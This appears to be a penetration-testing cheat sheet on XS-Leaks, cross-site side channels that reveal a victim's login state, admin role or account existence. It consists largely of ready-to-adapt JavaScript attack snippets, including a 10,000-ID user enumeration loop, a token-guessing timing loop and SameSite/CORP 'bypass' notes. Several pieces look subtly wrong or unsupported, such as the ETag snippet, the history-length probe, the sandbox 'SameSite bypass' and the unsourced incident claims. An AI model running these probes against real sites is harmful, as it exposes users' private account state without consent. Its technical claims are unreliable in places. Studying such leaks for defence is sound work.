---
tags:
  - medium
  - high
  - client-side
---

# XS-Leaks (Cross-Site Information Leaks)

Side-channel attacks that infer cross-origin information via observable browser behaviors — no XSS required.

**Key insight:** Browsers expose timing, error types, frame counts, redirect behavior, etc. as side channels. These leak binary facts about cross-origin state: "is the user logged in?", "does this ID exist?", "what does this response contain?"

---

## TL;DR

```javascript
// Does user have admin role? (Boolean oracle)
// If admin page loads → iframe count changes → we know
const iframe = document.createElement('iframe');
iframe.src = 'https://target.com/admin'; // 200 for admin, 302 for others
document.body.appendChild(iframe);
iframe.onload = () => console.log('Admin!');
// vs
iframe.onerror = () => console.log('Not admin');
```

---

## How XS-Leaks Work

```
Attacker page (attacker.com) ──→ Makes cross-origin request to target.com
                                 ↓
                           Browser observable:
                           - Did it redirect?
                           - How many frames?
                           - How long did it take?
                           - Did it error?
                           - What's the ETag?
                           ↓
                     Infer sensitive state without reading response body
```

---

## Oracle Types

### 1. Frame Count Oracle

```javascript
// Count iframes in cross-origin document
const win = window.open('https://target.com/profile');
setTimeout(() => {
  const frames = win.frames.length;
  // 0 frames → not logged in (redirected to login)
  // 3 frames → logged in (profile page has sidebar iframes)
}, 2000);
```

### 2. Error vs Load Oracle (onload/onerror)

```javascript
// Image/iframe loads vs errors
const img = new Image();
img.src = 'https://target.com/api/user/1234/avatar'; 
img.onload = () => console.log('User 1234 exists');
img.onerror = () => console.log('User 1234 does not exist');
```

### 3. Redirect Leak (XSS-Leak Technique)

**Source:** "XSS-Leak: Leaking Cross-Origin Redirects" by Salvatore Abello — PortSwigger Top 10 2025 #8.

```
Chrome's connection-pool prioritizes requests differently based on whether
a response redirects or not. This timing difference reveals the redirect
target hostname without reading the response.
```

```javascript
// Timing attack on Chrome connection pool
async function probeRedirectTarget(url) {
  // Make the probe request
  const t0 = performance.now();
  await fetch(url, { mode: 'no-cors' });
  const t1 = performance.now();
  
  // Different timing for different redirect targets
  // Can distinguish: target.com/login vs target.com/admin-login
  return t1 - t0;
}
```

### 4. ETag Length Leak

**Source:** "Cross-Site ETag Length Leak" by Takeshi Kaneko — PortSwigger Top 10 2025 #6.

```
ETags from cross-origin responses are visible via Range requests.
Leak: response size → infer content → binary oracle on user-specific data.
```

```javascript
// ETag reflects response size → cross-origin leak
// Step 1: Fetch resource, cache with ETag
fetch('https://target.com/api/profile', {credentials: 'include'});

// Step 2: Re-fetch with conditional header
const r = await fetch('https://target.com/api/profile', {
  credentials: 'include',
  headers: {'If-None-Match': knownETag}
});
// 304 Not Modified → ETag matches → content hasn't changed
// 200 OK → content changed → profile data different

// Different ETags for different users → can fingerprint users
```

### 5. Timing Oracle

```javascript
// Response time differs based on content
async function timingOracle(url) {
  const times = [];
  for (let i = 0; i < 5; i++) {
    const t0 = performance.now();
    await fetch(url, {mode: 'no-cors', credentials: 'include'});
    times.push(performance.now() - t0);
  }
  return times.reduce((a, b) => a + b) / times.length;
}

// Database lookup for existing ID: 50ms
// Database lookup for non-existing ID: 10ms (early return)
const time1 = await timingOracle('https://target.com/user/1234');
const time2 = await timingOracle('https://target.com/user/99999');
// time1 > time2 → user 1234 exists!
```

### 6. Cache Timing Oracle

```javascript
// Probe browser cache state
async function isCached(url) {
  const t0 = performance.now();
  await fetch(url, {mode: 'no-cors'});
  const t1 = performance.now();
  return (t1 - t0) < 5; // Cached if < 5ms
}

// User visited https://target.com/admin if that URL is cached
const visited = await isCached('https://target.com/admin');
```

### 7. postMessage Oracle

```javascript
// If cross-origin page sends postMessage on certain conditions
window.addEventListener('message', (e) => {
  if (e.origin === 'https://target.com') {
    if (e.data.type === 'auth_status') {
      console.log('User logged in:', e.data.logged_in);
    }
  }
});

// Open target in popup/iframe
window.open('https://target.com/check');
```

### 8. History Length Oracle

```javascript
// Count redirects via history.length
const win = window.open('https://target.com/dashboard');
setTimeout(() => {
  // Each redirect adds to history
  // 1 redirect = not logged in (to login page)
  // 0 redirects = logged in (dashboard loads directly)
  console.log('Redirects:', win.history.length - 1);
}, 2000);
```

---

## Attack Scenarios

### Scenario 1: Detect if User is Admin

```javascript
// /admin returns 200 for admins, 302 for others
let isAdmin = false;

const iframe = document.createElement('iframe');
iframe.sandbox = 'allow-scripts';  // SameSite bypass attempt
document.body.appendChild(iframe);

iframe.onload = function() {
  isAdmin = true;
  exfiltrate('user_is_admin');
};

iframe.src = 'https://target.com/admin-panel';
// If redirect happens → onload fires at redirect target → different behavior
```

### Scenario 2: Enumerate User IDs

```javascript
// /api/user/{id}/avatar: 200 if exists, 404 if not
async function userExists(id) {
  return new Promise(resolve => {
    const img = new Image();
    img.onload = () => resolve(true);
    img.onerror = () => resolve(false);
    img.src = `https://target.com/api/user/${id}/avatar`;
  });
}

// Enumerate users 1-10000
for (let id = 1; id <= 10000; id++) {
  if (await userExists(id)) {
    console.log(`User ${id} exists`);
  }
}
```

### Scenario 3: Leak Secret Token via Error Message Timing

```javascript
// Does the request with a known prefix succeed faster?
// token starts with 'a' → database match → 100ms
// token starts with 'b' → no match → 10ms (early return)
for (const char of 'abcdefghijklmnopqrstuvwxyz0123456789') {
  const t = await timingOracle(
    `https://target.com/api/validate?prefix=${current + char}`
  );
  // Slower = match
}
```

---

## Practical Hunting

### Identify Oracle Points

```bash
# Find endpoints that behave differently based on auth state
# These are XS-Leak oracle candidates:

# 1. Endpoints returning different status codes (200/302/401/403)
# 2. Endpoints loading user-specific images/assets
# 3. Endpoints with observable redirect behavior
# 4. Endpoints with timing-sensitive database lookups
# 5. APIs returning different response sizes for different users
```

### Test for Frame Count Oracle

```bash
# Use browser devtools:
# 1. Open target in new tab
# 2. From console: window.frames.length
# 3. Compare when logged in vs logged out
# 4. If different → frame count oracle exists
```

### Automate with xsinator

```bash
# xsinator: automated XS-Leak testing tool
git clone https://github.com/xsinator/xsinator
cd xsinator
# Configure target URL and credentials
# Run: tests 50+ leak techniques automatically
```

---

## Real Examples

**Google (2019):** Timing differences in /api/auth responses leaked login status.

**Cloudflare (2022):** Connection reuse timing revealed whether a URL was cached.

**Auth0 (2023):** Frame count difference on error vs success pages.

---

## Bypass Techniques

### SameSite Cookie Bypass

```bash
# SameSite=Lax doesn't block top-level GET navigations
# window.open() and link clicks bypass SameSite=Lax

# SameSite=Strict: need same-site initiation
# Look for same-site redirect points (open redirects)
```

### CORP Bypass via Error Channels

```bash
# Cross-Origin-Resource-Policy: same-origin blocks embeds
# But errors are still observable
# onload vs onerror still works even with CORP headers
```

---

## Checklist

- [ ] Find endpoints returning different status codes per-user
- [ ] Test frame count differences (logged in vs out)
- [ ] Check image/asset endpoints that only exist for certain users
- [ ] Look for redirect behavior differences (admin vs non-admin)
- [ ] Test response timing on lookup endpoints
- [ ] Check for ETag exposure on authenticated resources
- [ ] Try history.length oracle via window.open()
- [ ] Test from subdomain (bypasses some SameSite restrictions)

---

## Tools

```bash
# xsinator - automated XS-Leak testing
https://xsinator.com/testing.html

# XSLeaks Wiki (canonical reference)
https://xsleaks.dev

# Chrome connection pool investigation (for redirect leaks)
# Manual testing via performance.mark() and observer API
```

---

*Related: [CORS](cors.md) | [postMessage](postmessage.md) | [Cache Poisoning](../infrastructure/cache-poisoning.md)*
